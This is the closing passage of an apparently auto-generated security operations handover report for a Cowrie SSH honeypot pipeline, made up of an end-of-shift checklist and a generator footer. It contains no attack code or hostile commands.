- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-03T09:25:19Z_
